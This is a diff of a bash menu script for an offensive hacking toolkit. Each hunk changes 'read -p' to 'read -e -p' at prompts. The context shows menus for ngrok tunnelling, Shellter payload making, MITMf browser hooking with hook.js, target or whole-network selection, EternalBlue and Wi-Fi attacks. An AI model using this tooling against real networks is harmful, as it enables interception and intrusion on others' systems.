@@ -8362,7 +8362,7 @@ function select_interface
 		elif [[ "$CI" = 3 ]]
 		then
 			echo -e "Interface to use: "
-			read -p $'(\e[4;93minterface\e[0m)> ' ITU
+			read -e -p $'(\e[4;93minterface\e[0m)> ' ITU
 			TT=$(ifconfig | grep "$ITU:")
 			if [[ "$TT" != "" ]]
 			then
@@ -8373,7 +8373,7 @@ function select_interface
 			else
 				echo -e ""$RS"Could not find this interface"$CE""
 				echo -e "Do you still want to use it?"$YNNO": "
-				read -p $'(\e[4;93muse\e[0m)> ' SU
+				read -e -p $'(\e[4;93muse\e[0m)> ' SU
 				if [[ "$SU" = "y" ]]
 				then
 					SINT="$ITU"
@@ -8406,7 +8406,7 @@ function about_option
 	echo -e ""$YS" 1"$CE") Visit our site"
 	echo -e ""$YS" 2"$CE") Visit our GitHub"
         echo -e ""$YS" b"$CE") I'm not interested about this! :P"
-	read -p $'(\e[4;34mabout\e[0m)> ' DON
+	read -e -p $'(\e[4;34mabout\e[0m)> ' DON
 	if [[ "$DON" = "1" ]]
 	then
 		gio open "https://ehtools.pro/"
@@ -8448,7 +8448,7 @@ function ngrok_option
 			echo -e ""$YS" 4"$CE") Intergrate with Shellter"
 			echo -e ""$YS" 5"$CE") Set your ngrok authtoken"
 			echo -e ""$YS" b"$CE") Go back"
-			read -p $'(<\e[4;31mports\e[0m@\e[5;32mngrok\e[0m>#) ' NG
+			read -e -p $'(<\e[4;31mports\e[0m@\e[5;32mngrok\e[0m>#) ' NG
 			clear
 			if [[ "$NG" = "help" || "$NG" = "h" ]]
 			then
@@ -8466,7 +8466,7 @@ function ngrok_option
 			elif [[ "$NG" = 1 || "$NG" = 2 || "$NG" = 3 ]]
 			then
 				echo -e "Type the local port to forward: "
-				read -p $'(\e[4;93mlport\e[0m)> ' PORTL
+				read -e -p $'(\e[4;93mlport\e[0m)> ' PORTL
 				if [[ "$NG" = 1 ]]
 				then
 					PROT="tcp"
@@ -8487,7 +8487,7 @@ function ngrok_option
 					echo -e ""$YS" 1"$CE") Make a raw tcp payload for Shellter"
 					echo -e ""$YS" 2"$CE") How to intergrate it"
 					echo -e ""$YS" b"$CE") Go back"
-					read -p $'(\e[5;37mpayload\e[0m)> ' SHINT
+					read -e -p $'(\e[5;37mpayload\e[0m)> ' SHINT
 					clear
 					if [[ "$SHINT" = 1 ]]
 					then
@@ -8502,11 +8502,11 @@ function ngrok_option
 							#~ echo -e ""$YS" 2"$CE") Set your local tcp port             CURRENT:"$LPORT""
 							echo -e ""$YS" b"$CE") Go back"
 							echo -e ""$YS"run"$CE") Make the payload"
-							read -p $'(\e[5;37mconsole\e[0m)> ' RP
+							read -e -p $'(\e[5;37mconsole\e[0m)> ' RP
 							if [[ "$RP" = 1 ]]
 							then
 								echo -e "Ngrok port: "
-								read -p $'(\e[4;93mnport\e[0m)> ' NGPORT
+								read -e -p $'(\e[4;93mnport\e[0m)> ' NGPORT
 							elif [[ "$RP" = "back" || "$RP" = "b" ]]
 							then
 								break
@@ -8569,7 +8569,7 @@ function ngrok_option
 			elif [[ "$NG" = 5 ]]
 			then
 					echo -e "Type your authtoken: "
-					read -p $'(\e[4;93mauthtoken\e[0m)> ' AUTHT
+					read -e -p $'(\e[4;93mauthtoken\e[0m)> ' AUTHT
 					if [[ "$AUTHT" != "" ]]
 					then
 						./ngrok authtoken $AUTHT
@@ -8579,7 +8579,7 @@ function ngrok_option
 			fi
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_ngrok
@@ -8688,7 +8688,7 @@ do
 			then
 				echo -e ""$YS" r"$CE") Rescan"
 				echo -e ""$YS" b"$CE") Go back"
-				read -p $'(\e[4;34mscanner\e[0m)> ' sch
+				read -e -p $'(\e[4;34mscanner\e[0m)> ' sch
 				if [[ "$sch" = "b" ]]
 				then
 					echo ""
@@ -8803,7 +8803,7 @@ function browser_exploiting
 		#~ echo -e ""$YS" 4"$CE") Close all windows"
 		echo -e ""$YS" i"$CE") Info"
 		echo -e ""$YS" b"$CE") Go back"
-		read -p $'(\e[4;35mbrowser\e[0m)> ' AEB
+		read -e -p $'(\e[4;35mbrowser\e[0m)> ' AEB
 		clear
 		if [[ "$AEB" = "b" || "$AEB" = 00 ]]
 		then
@@ -8837,7 +8837,7 @@ function browser_exploiting
 			echo -e ""$YS" 3"$CE") MITMf error: Could not resolve Gateway's MAC"
 			echo -e ""$YS" 4"$CE") MITMf error: [Errno 98] Address already in use"
 			echo -e ""$YS" b"$CE") Go back"
-			read -p $'(\e[4;31merrors\e[0m)> ' AE
+			read -e -p $'(\e[4;31merrors\e[0m)> ' AE
 			clear
 			if [[ "$AE" = 1 ]]
 			then
@@ -8928,7 +8928,7 @@ function browser_exploiting
 					echo -e ""$YS" 2"$CE") Type target's IP"
 						echo -e ""$YS" 3"$CE") Target the whole network"
 					echo -e ""$YS" b"$CE") Go back"
-					read -p $'(\e[4;33mtarget\e[0m)> ' TARR
+					read -e -p $'(\e[4;33mtarget\e[0m)> ' TARR
 					clear
 					if [[ "$TARR" = "b" ]]
 					then
@@ -8950,7 +8950,7 @@ function browser_exploiting
 					elif [[ "$TARR" = 2 ]]
 					then
 						echo -e "Target: "
-						read -p $'(\e[4;93mtarget\e[0m)> ' TARGETI
+						read -e -p $'(\e[4;93mtarget\e[0m)> ' TARGETI
 						size=${#TARGETI}
 						if [[ "$size" -le 16 && "$size" -ge 7 ]]
 						then
@@ -9004,7 +9004,7 @@ function browser_exploiting
 							fi
 							clear
 							echo -e "hook.js URL path("$YS"Enter"$CE"=http://"$mitmflocalip":3000/hook.js): "
-							read -p $'(\e[4;93murl\e[0m)> ' hookch
+							read -e -p $'(\e[4;93murl\e[0m)> ' hookch
 							if [[ "$hookch" = "" ]]
 							then
 								mitmfhook="http://"$mitmflocalip":3000/hook.js"
@@ -9028,7 +9028,7 @@ function browser_exploiting
 						fi
 				else
 					echo -e "$TNI"
-					read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+					read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 					if [[ "$INSTALL" = "install" ]]
 					then
 						install_mitmf
@@ -9127,7 +9127,7 @@ function settings_menu
 		echo -e ""$YS" 8"$CE") Interface for iftop    (show bandwidth)      $iftopint"
                 echo -e ""$YS" b"$CE") Go back"
 		echo -e ""$YS" 0"$CE") Exit"
-		read -p $'(\e[4;93msettings\e[0m)> ' SET
+		read -e -p $'(\e[4;93msettings\e[0m)> ' SET
 		clear
 		if [[ "$SET" = "back" || "$SET" = "b" || "$SET" = "00" ]]
 		then
@@ -9148,13 +9148,13 @@ function settings_menu
 		then
 			clear
 			echo -e ""$BS"Interface to be used for iftop: "$CE""
-			read -p $'(\e[4;93minterface\e[0m)> ' IFTOP
+			read -e -p $'(\e[4;93minterface\e[0m)> ' IFTOP
 			IFTOPTEST=$(ifconfig | grep "$IFTOP")
 			if [[ "$IFTOPTEST" = "" ]]
 			then
 				echo -e ""$RS""$IFTOP" is not currently available."$CE""
 				echo -e "Do you still want to use $IFTOP for iftop?"$YNYES""
-				read -p $'(\e[4;93muse\e[0m)> ' STARP
+				read -e -p $'(\e[4;93muse\e[0m)> ' STARP
 				if [[ "$STARP" = "n" ]]
 				then
 					IFTOP=""
@@ -9166,13 +9166,13 @@ function settings_menu
 		then
 			clear
 			echo -e ""$BS"Interface to be used for arp-scan: "$CE""
-			read -p $'(\e[4;93minterface\e[0m)> ' ARPIN
+			read -e -p $'(\e[4;93minterface\e[0m)> ' ARPIN
 			ARPINTEST=$(ifconfig | grep "$ARPIN")
 			if [[ "$ARPINTEST" = "" ]]
 			then
 				echo -e ""$RS""$ARPIN" is not currently available."$CE""
 				echo -e "Do you still want to use $ARPIN for arp-scan?"$YNYES""
-				read -p $'(\e[4;93muse\e[0m)> ' STARP
+				read -e -p $'(\e[4;93muse\e[0m)> ' STARP
 				if [[ "$STARP" = "n" ]]
 				then
 					ARPIN=""
@@ -9184,7 +9184,7 @@ function settings_menu
 		then
 			clear
 			echo -e "Type new MAC("$YS"Enter"$CE"="$DEFMAC"): "
-			read -p $'(\e[4;93mmac\e[0m)> ' NEWMAC
+			read -e -p $'(\e[4;93mmac\e[0m)> ' NEWMAC
 			if [[ "$NEWMAC" = "" ]]
 			then
 				echo "$DEFMAC" > "$EPATH"/settings/startmac.txt
@@ -9295,7 +9295,7 @@ function settings_menu
 				echo -e ""$YS" 4"$CE") Number of answers to return               "$numofans""
 				echo -e ""$YS" 5"$CE") Clear the cache"
 				echo -e ""$YS" b"$CE") Go back"
-				read -p $'(\e[4;31mhowdoi\e[0m)> ' HOWCH
+				read -e -p $'(\e[4;31mhowdoi\e[0m)> ' HOWCH
 				if [[ "$HOWCH" = 1 ]]
 				then
 					if [[ "$dispfull" = "false" ]]
@@ -9326,7 +9326,7 @@ function settings_menu
 				elif [[ "$HOWCH" = 4 ]]
 				then
 					echo -e "Type number of answers to return: "
-					read -p $'(\e[4;93mnumber\e[0m\en)> ' numofans
+					read -e -p $'(\e[4;93mnumber\e[0m\en)> ' numofans
 					echo "$numofans" > "$EPATH"/settings/numofans.txt
 				elif [[ "$HOWCH" = 5 ]]
 				then
@@ -9369,7 +9369,7 @@ function settings_menu
 			echo -e ""$YS"14"$CE") Brown                   "$BRS"SAMPLE"$CE""
 			echo -e ""$YS"15"$CE") White                   "$WHS"SAMPLE"$CE""
 			echo -e ""$YS"16"$CE") Black                   "$BLS"SAMPLE"$CE""
-			read -p $'(\e[4;34mcolor\e[0m)> ' LC
+			read -e -p $'(\e[4;34mcolor\e[0m)> ' LC
 			if [[ "$LC" = 1 ]]
 			then
 				echo -e "\e[1;31m" > "$EPATH"/settings/logocolor.txt
@@ -9599,7 +9599,7 @@ function main_options
         clear
 	fi
 		echo -e ""$BS"Copycat Toolkit:"$CE" "
-		read -p $'(\e[4;34mcopycat\e[0m\en)> ' IPG
+		read -e -p $'(\e[4;34mcopycat\e[0m\en)> ' IPG
         
         if [[ -f /usr/local/bin/copycat ]]
 	then
@@ -9632,7 +9632,7 @@ function main_options
 		if [[ ! -f "/usr/local/bin/howdoi" ]]
 		then
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_howdoi
@@ -9680,7 +9680,7 @@ function main_options
 				na=""
 			fi
 			echo -e "Howdoi:  "
-			read -p $'(\e[4;31mhowdoi\e[0m\en)> ' HOW
+			read -e -p $'(\e[4;31mhowdoi\e[0m\en)> ' HOW
 			howdoi $co $na $ol $df $HOW
 		fi
 	elif [[ "$YORNAA" = "settings" || "$YORNAA" = "s" ]]
@@ -9802,7 +9802,7 @@ function main_options
 		if [[ ! -f "/etc/init.d/anonym8.sh" ]]
 		then
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_anonym8
@@ -9817,7 +9817,7 @@ function main_options
 		if [[ ! -f "/etc/init.d/anonym8.sh" ]]
 		then
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_anonym8
@@ -9832,7 +9832,7 @@ function main_options
 		if [[ ! -f "/usr/bin/anonsurf" ]]
 		then
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_anonsurf
@@ -9847,7 +9847,7 @@ function main_options
 		if [[ ! -f "/usr/bin/anonsurf" ]]
 		then
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_anonsurf
@@ -9862,7 +9862,7 @@ function main_options
 		if [[ ! -f "/usr/bin/anonsurf" ]]
 		then
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_anonsurf
@@ -9877,7 +9877,7 @@ function main_options
 		if [[ ! -f "/usr/bin/anonsurf" ]]
                 then
 			echo -e "$TNI"
-                        read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+                        read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_anonsurf
@@ -9892,7 +9892,7 @@ function main_options
 		if [[ ! -f "/usr/bin/anonsurf" ]]
 		then
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_anonsurf
@@ -9964,7 +9964,7 @@ function main_options
 			eternalblue_check
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_wifiphisher
@@ -9977,7 +9977,7 @@ function main_options
 			eternalblue
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_wifiphisher
@@ -9990,7 +9990,7 @@ function main_options
 			wififb_attack
 		else
 			echo -e "$TNI"
-			read -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
+			read -e -p $'(\e[4;93mconfirm\e[0m\en)> ' INSTALL
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_wifiphisher
@@ -10049,7 +10049,7 @@ check_if_ks
 					fi
 			else
 				echo -e ""$YS"Removing old and install again?"$CE"("$YS"y"$CE"/"$YS"n"$CE")"
-				read -p $'(\e[4;93mremove\e[0m\en)> ' ROIN
+				read -e -p $'(\e[4;93mremove\e[0m\en)> ' ROIN
 				if [[ "$ROIN" == "y" ]]
 				then
 					if [[ "$foldname" != "" ]]
